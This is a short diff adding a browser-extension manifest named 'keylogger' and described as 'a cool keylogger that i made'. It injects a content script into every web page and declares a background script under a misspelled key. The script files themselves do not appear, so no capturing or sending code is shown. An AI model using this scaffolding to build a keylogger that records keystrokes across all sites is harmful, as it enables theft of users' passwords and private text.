@@ -1,0 +1,18 @@
+{
+    "manifest_version": 2,
+    "name": "keylogger",
+    "version": "1",
+    "icons" : {
+        "720" : "icon.png"
+    },
+    "description": "a cool keylogger that i made",
+    "backround": {
+        "scripts": ["backround.js"]
+      },
+      "content_scripts": [
+        {
+            "matches": ["*://*/*"],
+            "js": ["content.js"]
+        }
+      ]
+}
